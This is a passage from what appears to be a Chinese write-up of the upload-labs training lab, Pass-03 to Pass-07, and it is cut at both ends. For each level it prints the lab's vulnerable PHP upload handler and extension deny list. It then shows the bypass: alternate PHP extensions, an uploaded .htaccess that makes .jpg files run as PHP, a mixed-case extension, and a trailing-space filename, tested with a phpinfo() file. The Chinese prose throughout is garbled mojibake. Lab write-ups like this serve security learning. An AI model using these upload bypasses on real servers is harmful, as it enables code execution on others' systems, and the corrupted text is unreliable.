.pht</span><br></pre></td></tr></table></figure><p>å‰ææ˜¯apacheçš„<code>httpd.conf</code>ä¸­æœ‰å¦‚ä¸‹é…ç½®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶,éœ€è¦ï¼š</p><ul><li><p><code>mod_rewriteæ¨¡å—å¼€å¯</code></p></li><li><p><code>AllowOverride All</code></p></li><li><p>æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><ul><li><pre><code class="php">&lt;FilesMatch &quot;shell.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - æ­¤æ—¶ä¸Šä¼ &#96;shell.jpg&#96;æ–‡ä»¶å³å¯è¢«å½“ä½œphpæ¥è§£æ</span><br><span class="line"></span><br><span class="line">æˆ–è€…</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><blockquote><p>æ‰€æœ‰<code>.jpg</code>æ–‡ä»¶ä¼šè¢«è§£ææˆphpæ–‡ä»¶</p></blockquote><p><font color="red">è¿™é‡Œç¬¬15è¡Œä»£ç ï¼Œä¼šç»™æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œå¯¼è‡´ä¸Šä¼ çš„<code>.htaccess</code>ä¼šå˜æˆ<code>æ•°å­—.htaccess</code></font></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103151931851.png" alt="image-20201103151931851"></p><p>æˆ‘ä»¬ç”¨ç¬¬ä¸€ç§æ–¹æ³•</p><h3 id="2-åˆ©ç”¨-2"><a href="#2-åˆ©ç”¨-2" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p>ä¸Šä¼ åç¼€ä¸º<code>.php5</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103150159067.png" alt="image-20201103150159067"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103150206566.png" alt="image-20201103150206566"></p><h2 id="Pass-04-htaccessç»•è¿‡"><a href="#Pass-04-htaccessç»•è¿‡" class="headerlink" title="Pass-04 .htaccessç»•è¿‡"></a>Pass-04 .htaccessç»•è¿‡</h2><h3 id="1-åˆ†æ-3"><a href="#1-åˆ†æ-3" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-04</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å„ç§ç½•è§åç¼€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤<code>.htaccess</code>,ä¸Šè¿°ä»£ç è·Ÿç¬¬ä¸‰é¢˜ç±»ä¼¼,ä»£ç åˆ†æå‚çœ‹Pass-03</p><h3 id="2-åˆ©ç”¨-3"><a href="#2-åˆ©ç”¨-3" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p>ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><blockquote><p>å°†åç¼€<code>.jpg</code>çš„æ–‡ä»¶è§£é‡Šä¸ºphpå¯æ‰§è¡Œæ–‡ä»¶</p></blockquote><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103151003690.png" alt="image-20201103151003690"></p><p>ç„¶åä¸Šä¼ <code>phpinfo.jpg</code>, å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103151024526.png" alt="image-20201103151024526"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103151036864.png" alt="image-20201103151036864"></p><h2 id="Pass-05-å¤§å°å†™ç»•è¿‡"><a href="#Pass-05-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass-05 å¤§å°å†™ç»•è¿‡"></a>Pass-05 å¤§å°å†™ç»•è¿‡</h2><h3 id="1-åˆ†æ-4"><a href="#1-åˆ†æ-4" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-05</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¦ç”¨äº†ç½•è§çš„ä¸€äº›åç¼€ï¼Œä»¥åŠ<code>.htaccess</code>, ä½†æ˜¯å¹¶æ²¡æœ‰å°†åç¼€è½¬æ¢æˆå°å†™ï¼Œè¿™é‡Œæ²¡æœ‰<code>strtolower()</code>å‡½æ•°è¿›è¡Œåç¼€å¤„ç†ï¼Œè€Œç¦ç”¨çš„åç¼€å¹¶æ²¡æœ‰åŒ…æ‹¬<code>Php</code>åç¼€</p><blockquote><p> æ³¨æ„ï¼šåœ¨Linuxæ²¡æœ‰ç‰¹æ®Šé…ç½®çš„æƒ…å†µä¸‹ï¼Œè¿™ç§æƒ…å†µåªæœ‰winå¯ä»¥ï¼Œå› ä¸ºwinä¼šå¿½ç•¥å¤§å°å†™</p></blockquote><h3 id="2-åˆ©ç”¨-4"><a href="#2-åˆ©ç”¨-4" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103152856438.png" alt="image-20201103152856438"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103152910258.png" alt="image-20201103152910258"></p><h2 id="Pass-06-ç©ºæ ¼ç»•è¿‡"><a href="#Pass-06-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass-06 ç©ºæ ¼ç»•è¿‡"></a>Pass-06 ç©ºæ ¼ç»•è¿‡</h2><h3 id="1-ä»£ç åˆ†æ"><a href="#1-ä»£ç åˆ†æ" class="headerlink" title="1. ä»£ç åˆ†æ"></a>1. ä»£ç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-06</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103153619133.png" alt="image-20201103153619133"></p><p>åœ¨Winä¸‹<code>xx.jpg[ç©ºæ ¼]</code> æˆ–<code>xx.jpg.</code>è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹æ­¤å¤„ä¼šåˆ é™¤æœ«å°¾çš„ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰å»æ‰æœ«å°¾çš„ç©ºæ ¼ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ª<code>.phpç©ºæ ¼</code>æ–‡ä»¶å³å¯</p><p><code>.phpç©ºæ ¼</code>ç»•è¿‡äº†<code>$deny_ext</code>çš„éªŒè¯ï¼Œå¯¼è‡´äº†æ–‡ä»¶ä¸Šä¼ </p><h3 id="2-åˆ©ç”¨-5"><a href="#2-åˆ©ç”¨-5" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103153757039.png" alt="image-20201103153757039"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103153828227.png" alt="image-20201103153828227"></p><h2 id="Pass-07-ç»•è¿‡"><a href="#Pass-07-ç»•è¿‡" class="headerlink" title="Pass-07 .ç»•è¿‡"></a>Pass-07 .ç»•è¿‡</h2><h3 id="1-åˆ†æ-5"><a href="#1-åˆ†æ-5" class="headerlink" title="1.åˆ†æ"></a>1.åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-07</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span 